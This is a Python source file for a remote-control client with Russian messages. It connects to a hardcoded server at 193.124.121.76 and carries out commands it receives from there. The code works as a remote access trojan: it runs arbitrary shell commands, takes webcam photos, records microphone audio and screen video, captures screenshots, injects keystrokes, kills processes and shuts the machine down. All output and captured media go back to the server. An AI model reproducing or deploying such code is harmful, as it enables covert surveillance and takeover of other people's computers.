import requests
import socket
import time
import platform
import hashlib
from threading import Thread
import uuid
import sys
import pyautogui
import os
import base64
import subprocess
import psutil
import ctypes
import json
import cv2
import numpy as np
import pyaudio
import wave
import keyboard as kb
from io import BytesIO

SERVER_URL = "http://193.124.121.76:4443"

def generate_device_id():
    pc_name = platform.node()
    unique_hash = hashlib.md5(str(uuid.getnode()).encode()).hexdigest()[:6].upper()
    device_id = f"{pc_name}-{unique_hash}"
    return ''.join(e for e in device_id if e.isalnum() or e == '-')

def get_system_info():
    return {
        "name": platform.node(),
        "os": platform.system(),
        "release": platform.release(),
        "processor": platform.processor(),
        "ip": socket.gethostbyname(socket.gethostname())
    }

class PCClient:
    def __init__(self):
        self.device_id = generate_device_id()
        self.system_info = get_system_info()
        self.running = True
        
    def register_device(self):
        while self.running:
            try:
                data = {
                    "device_id": self.device_id,
                    "system_info": self.system_info,
                    "status": "online"
                }
                
                response = requests.post(
                    f"{SERVER_URL}/register",
                    json=data,
                    timeout=10
                )
                
                if response.status_code == 200:
                    print(f"Устройство {self.device_id} успешно зарегистрировано")
                    return True
                else:
                    print(f"Ошибка регистрации: {response.status_code} - {response.text}")
                    time.sleep(30)
                    
            except requests.exceptions.RequestException as e:
                print(f"Ошибка подключения: {e}")
                time.sleep(30)
                
        return False
    
    def send_heartbeat(self):
        while self.running:
            try:
                response = requests.post(
                    f"{SERVER_URL}/heartbeat",
                    json={"device_id": self.device_id},
                    timeout=5
                )
                
                if response.status_code != 200:
                    print(f"Ошибка heartbeat: {response.text}")
                    
                print('heartbeat отправлен')
                time.sleep(60)
                
            except Exception as e:
                print(f"Ошибка отправки heartbeat: {e}")
                time.sleep(10)
    
    def check_commands(self):
        while self.running:
            try:
                response = requests.get(
                    f"{SERVER_URL}/commands?device_id={self.device_id}",
                    timeout=10
                )
                
                if response.status_code == 200:
                    commands = response.json().get("commands", [])
                    for cmd in commands:
                        self.execute_command(cmd)
                elif response.status_code != 200:
                    print(f"Ошибка получения команд: {response.text}")
                
                time.sleep(5)
                
            except Exception as e:
                print(f"Ошибка проверки команд: {e}")
                time.sleep(10)
    
    def execute_command(self, command):
        try:
            print(f"Получена команда: {command['command']}")
            result = ""
            file_data = None
            file_type = None
            cmd = command['command']
            # Для show_message поддерживаем кастомный текст
            if cmd.startswith('show_message:'):
                title = "Сообщение"
                text = cmd[len('show_message:'):]
                pyautogui.alert(text=text, title=title)
                result = f"Показано сообщение: {title} - {text}"
            elif cmd.startswith('hotkey:'):
                hotkey = cmd[len('hotkey:'):].replace(' ', '')
                try:
                    kb.press_and_release(hotkey)
                    result = f"Выполнена комбинация клавиш: {hotkey}"
                except Exception as e:
                    result = f"Ошибка выполнения hotkey: {hotkey} — {e}"
            elif cmd.startswith('cmd:'):
                user_cmd = cmd[len('cmd:'):]
                try:
                    output = subprocess.check_output(user_cmd, shell=True, stderr=subprocess.STDOUT, text=True, encoding='cp866')
                except Exception as e:
                    output = str(e)
                lines = output.splitlines()
                if len(lines) > 30:
                    output = '\n'.join(lines[:30]) + '\n...Обрезано...'
                result = output
            elif cmd == 'processes':
                processes = []
                for proc in psutil.process_iter(['pid', 'name']):
                    try:
                        processes.append(f"{proc.info['name']} ({proc.info['pid']})")
                    except Exception:
                        continue
                if len(processes) > 30:
                    result = '\n'.join(processes[:30]) + '\n...Обрезано...'
                else:
                    result = '\n'.join(processes)
            elif cmd.startswith('killprocess:'):
                proc = cmd[len('killprocess:'):].strip()
                killed = False
                for p in psutil.process_iter(['pid', 'name']):
                    try:
                        if str(p.info['pid']) == proc or p.info['name'].lower() == proc.lower():
                            p.kill()
                            killed = True
                    except Exception:
                        continue
                if killed:
                    result = f"Процесс {proc} завершён"
                else:
                    result = f"Процесс {proc} не найден или не завершён"
            elif cmd.startswith('open_image:'):
                import tempfile
                import webbrowser
                import base64
                img_data = cmd[len('open_image:'):]
                img_bytes = base64.b64decode(img_data)
                with tempfile.NamedTemporaryFile(delete=False, suffix='.png') as f:
                    f.write(img_bytes)
                    img_path = f.name
                # Открыть на весь экран (Windows)
                os.startfile(img_path)
                result = "Изображение открыто на весь экран"
            elif cmd == 'screenshot':
                result, file_data, file_type = self.take_screenshot()
            elif cmd == 'webcam':
                result, file_data, file_type = self.capture_webcam()
            elif cmd == 'record_video_10':
                result, file_data, file_type = self.record_video(10)
            elif cmd == 'record_audio_10':
                result, file_data, file_type = self.record_audio(10)
            elif cmd == 'mouse_click':
                pyautogui.click()
                result = "Выполнен клик мыши"
            elif cmd == 'shutdown':
                subprocess.run(["shutdown", "/s", "/t", "0"])
                result = "Компьютер выключается"
            elif cmd == 'reboot':
                subprocess.run(["shutdown", "/r", "/t", "0"])
                result = "Компьютер перезагружается"
            elif cmd == 'lock':
                ctypes.windll.user32.LockWorkStation()
                result = "Компьютер заблокирован"
            elif cmd == 'sleep':
                subprocess.run(["rundll32.exe", "powrprof.dll,SetSuspendState", "0,1,0"])
                result = "Компьютер переведен в спящий режим"
            self.send_command_result(command['id'], result, file_data, file_type)
        except Exception as e:
            print(f"Ошибка выполнения команды: {e}")
            self.send_command_result(command['id'], f"Ошибка: {str(e)}")
    
    def take_screenshot(self):
        try:
            screenshot = pyautogui.screenshot()
            img_bytes = BytesIO()
            screenshot.save(img_bytes, format='PNG')
            img_bytes = img_bytes.getvalue()
            return "Скриншот выполнен", base64.b64encode(img_bytes).decode('utf-8'), 'photo'
        except Exception as e:
            return f"Ошибка создания скриншота: {str(e)}", None, None
    
    def capture_webcam(self):
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cap.release()
            
            if ret:
                _, img_encoded = cv2.imencode('.jpg', frame)
                img_bytes = img_encoded.tobytes()
                return "Фото с веб-камеры сделано", base64.b64encode(img_bytes).decode('utf-8'), 'photo'
            else:
                return "Не удалось получить фото с веб-камеры", None, None
        except Exception as e:
            return f"Ошибка доступа к веб-камере: {str(e)}", None, None
    
    def record_video(self, seconds):
        try:

            screen_size = pyautogui.size()
            fourcc = cv2.VideoWriter_fourcc(*'MJPG')
            temp_file = f"temp_screenvideo_{self.device_id}.avi"
            out = cv2.VideoWriter(temp_file, fourcc, 10.0, screen_size)
            start_time = time.time()
            frame_written = False
            while (time.time() - start_time) < seconds:
                img = pyautogui.screenshot()
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                out.write(frame)
                frame_written = True
            out.release()
            if not frame_written:
                return "Ошибка: не удалось записать видео (нет кадров)", None, None
            with open(temp_file, "rb") as f:
                video_bytes = f.read()
            os.remove(temp_file)
            return f"Видео экрана записано ({seconds} сек)", base64.b64encode(video_bytes).decode('utf-8'), 'video'
        except Exception as e:
            return f"Ошибка записи видео: {str(e)}", None, None
    
    def record_audio(self, seconds):
        try:
            CHUNK = 1024
            FORMAT = pyaudio.paInt16
            CHANNELS = 2
            RATE = 44100
            RECORD_SECONDS = seconds
            temp_file = f"temp_audio_{self.device_id}.wav"
            p = pyaudio.PyAudio()
            try:
                stream = p.open(format=FORMAT,
                              channels=CHANNELS,
                              rate=RATE,
                              input=True,
                              frames_per_buffer=CHUNK)
            except Exception:
                # fallback на 1 канал
                CHANNELS = 1
                stream = p.open(format=FORMAT,
                              channels=CHANNELS,
                              rate=RATE,
                              input=True,
                              frames_per_buffer=CHUNK)
            frames = []
            for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
                data = stream.read(CHUNK)
                frames.append(data)
            stream.stop_stream()
            stream.close()
            p.terminate()
            wf = wave.open(temp_file, 'wb')
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            wf.close()
            with open(temp_file, "rb") as f:
                audio_bytes = f.read()
            os.remove(temp_file)
            return f"Аудио записано ({seconds} сек)", base64.b64encode(audio_bytes).decode('utf-8'), 'audio'
        except Exception as e:
            return f"Ошибка записи аудио: {str(e)}", None, None
    
    def send_command_result(self, command_id, result, file_data=None, file_type=None):
        data = {
            "device_id": self.device_id,
            "command_id": command_id,
            "result": result
        }
        
        if file_data and file_type:
            data["file_type"] = file_type
            data["file_data"] = file_data
        
        try:
            requests.post(
                f"{SERVER_URL}/command_result",
                json=data,
                timeout=30
            )
        except Exception as e:
            print(f"Ошибка отправки результата: {e}")
    
    def run(self):
        print(f"Запуск клиента с ID: {self.device_id}")
        
        if self.register_device():
            Thread(target=self.send_heartbeat, daemon=True).start()
            Thread(target=self.check_commands, daemon=True).start()
            
            try:
                while self.running:
                    time.sleep(1)
            except KeyboardInterrupt:
                self.running = False
                print("Клиент остановлен")

if __name__ == '__main__':
    try:
        client = PCClient()
        client.run()
    except Exception as e:
        print(f"Фатальная ошибка: {e}")
        sys.exit(1)